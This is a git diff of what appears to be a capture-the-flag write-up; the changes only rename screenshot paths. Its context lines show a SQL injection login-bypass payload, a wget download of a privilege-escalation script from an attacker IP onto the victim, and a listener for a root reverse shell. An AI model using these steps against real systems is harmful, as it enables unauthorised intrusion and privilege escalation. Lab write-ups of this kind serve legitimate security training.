@@ -76,7 +76,7 @@ We use the following payload for authentication bypass
 admin' or '
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>
 
 We will now test for OS Command Injection
 
@@ -128,9 +128,9 @@ Using a python web server, I download the file onto the victim machine and chang
 wget 10.10.14.19/privesc.php
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>
 
 Now set up a new listener (in my case, I will listen on port 445) and in just a few seconds, you should receive another shell, but this time as root
 
